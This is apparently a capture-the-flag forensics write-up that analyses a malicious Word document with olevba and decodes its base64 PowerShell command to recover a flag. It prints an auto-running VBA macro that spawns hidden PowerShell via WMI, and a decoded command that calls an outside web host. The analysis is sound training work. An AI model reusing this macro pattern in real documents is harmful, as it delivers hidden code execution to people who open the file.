# **Homework**

### **Challenge**
We received our daily email from our teacher about our homework but it looks different today :(

<br>
<br>

#### **Creator**: Gabriel Seet


#### **Category:** Forensics



<br>

---

### **Solution**

We are given a .doc file to analyse.

The file is flagged as **malicious**, so I used `Olevba` to analyse the file as shown below:

```console
┌──(root㉿kali)-[~]
└─# olevba --decode Homework.doc

olevba 0.60.1 on Python 3.10.5 - http://decalage.info/python/oletools
===============================================================================
FILE: Homework.doc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Homework.doc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
        Sub Document_Open()
        Execute

        End Sub


             Public Function Execute() As Variant
                Const HIDDEN_WINDOW = 0
                strComputer = "."
                Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
         
                Set objStartup = objWMIService.Get("Win32_ProcessStartup")
                Set objConfig = objStartup.SpawnInstance_
                objConfig.ShowWindow = HIDDEN_WINDOW
                Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
                objProcess.Create "powershell.exe -encoded JABmAGwAYQBnACAAPQAgACIARgBMAEEARwB7AHcAMAByAGQAIgA7ACAAJAB3AHMAaABlAGwAbAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBDAG8AbQBPAGIAagBlAGMAdAAgAFcAcwBjAHIAaQBwAHQALgBTAGgAZQBsAGwAOwAgACQAdwBzAGgAZQBsAGwALgBQAG8AcAB1AHAAKAAiAEgAZQBsAGwAbwAgAFcAbwByAGwAZAAiACwAMAAsACIAOgBEACIALAAwAHgAMQApADsAIABpAHcAcgAgAGgAdAB0AHAAcwA6AC8ALwBuAHkAcABjAGcAYwBxAHUAYQBsAHMALgBjAG8AbQAvAF8AcAAwAHcAMwByADsAIAAkAHMAIAA9ACAAIgBzAGgAZQBsAGwAfQAiADsAIAAkAGEAIAA9ACAAJABzAC4AcgBlAHAAbABhAGMAZQAoACIAZQAiACwAIAAiADMAIgApAA==", Null, objConfig, intProcessID
             End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|powershell          |May run PowerShell commands                  |
|Suspicious|ShowWindow          |May hide the application                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|IOC       |powershell.exe      |Executable file name                         |
+----------+--------------------+---------------------------------------------+


```


There is an encoded base64 in the file, we'll decipher it and see what we get.

<br>
<br>

```console
┌──(root㉿kali)-[~]
└─# echo 'JABmAGwAYQBnACAAPQAgACIARgBMAEEARwB7AHcAMAByAGQAIgA7ACAAJAB3AHMAaABlAGwAbAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBDAG8AbQBPAGIAagBlAGMAdAAgAFcAcwBjAHIAaQBwAHQALgBTAGgAZQBsAGwAOwAgACQAdwBzAGgAZQBsAGwALgBQAG8AcAB1AHAAKAAiAEgAZQBsAGwAbwAgAFcAbwByAGwAZAAiACwAMAAsACIAOgBEACIALAAwAHgAMQApADsAIABpAHcAcgAgAGgAdAB0AHAAcwA6AC8ALwBuAHkAcABjAGcAYwBxAHUAYQBsAHMALgBjAG8AbQAvAF8AcAAwAHcAMwByADsAIAAkAHMAIAA9ACAAIgBzAGgAZQBsAGwAfQAiADsAIAAkAGEAIAA9ACAAJABzAC4AcgBlAHAAbABhAGMAZQAoACIAZQAiACwAIAAiADMAIgApAA==' | base64 --decode

$flag = "FLAG{w0rd"; $wshell = New-Object -ComObject Wscript.Shell; $wshell.Popup("Hello World",0,":D",0x1); iwr https://nypcgcquals.com/_p0w3r; $s = "shell}"; $a = $s.replace("e", "3")
```

We can see that parts of the flag are scattered throughout the decrypted output.

<br>
<br>

First part is **`FLAG{w0rd`**.

Second part is **`_p0w3r`**.

Last part is **`shell}`** (replace e with 3, given `$s.replace("e", "3")`)

<br>
<br>

Putting them together, we get the flag:

> **FLAG{w0rd_p0w3rsh3ll}**

